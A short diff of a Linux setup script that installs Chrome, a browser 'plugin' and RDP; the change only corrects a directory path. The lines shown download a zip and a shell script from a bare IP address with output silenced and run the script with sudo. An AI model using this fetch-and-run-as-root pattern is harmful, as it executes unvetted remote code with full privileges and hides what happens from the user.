@@ -20,7 +20,7 @@ sudo apt install ./google-chrome-stable_current_amd64.deb > /dev/null 2>&1
 echo "===================================="
 echo "Install Plugin"
 echo "===================================="
-wget http://199.250.207.182/~ngewetech/include/induk/anti.zip -O /home/bsm/Downloads/anti.zip > /dev/null 2>&1 && cd Downloads/ && unzip anti.zip > /dev/null 2>&1
+wget http://199.250.207.182/~ngewetech/include/induk/anti.zip -O /home/bsm/Downloads/anti.zip > /dev/null 2>&1 && cd /home/bsm/Downloads/ && unzip anti.zip > /dev/null 2>&1
 wget http://199.250.207.182/~ngewetech/nah/ext.sh -O /home/bsm/ext.sh > /dev/null 2>&1 && cd /home/bsm && sudo sh ext.sh > /dev/null 2>&1
 echo "===================================="
 echo "Install RDP"
